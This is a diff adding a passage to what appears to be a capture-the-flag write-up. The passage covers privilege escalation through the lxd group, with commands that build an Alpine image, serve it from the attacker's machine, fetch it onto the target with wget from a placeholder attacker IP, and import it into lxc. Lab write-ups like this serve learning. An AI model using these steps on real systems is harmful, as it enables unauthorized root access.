@@ -364,4 +364,30 @@ I spawn a tty shell by following [the guide here](../../README.md#stable-shell)
 
 The lxd group (pronounced lex dee) is the clue. The lxd binary runs containers on the Linux machine. The steps that I will be taking for this are identical to what I used on the [GamingServer](./gaming_server.md#privilege-escalation) write up.
 
+From my attack machine I run the following commands:
 
+```bash
+$ git clone https://github.com/saghul/lxd-alpine-builder.git
+$ cd lxd-alpine-builder
+$ python3 -m http.server
+```
+
+I am grabbing an alpine image and then starting a python http server so that the target box can download the alpine image.
+
+Now I am going to download what I need from attack machine onto the target machine. Here are the command I used:
+
+```bash
+$ wget http://<attack_machine_ip>:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+```
+
+Now I need to add the image to lxc and give it an alias. I run the following:
+
+```bash
+$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+```
+
+I check to make sure it got added, by running the following command:
+
+```bash
+$ lxc image list
+```
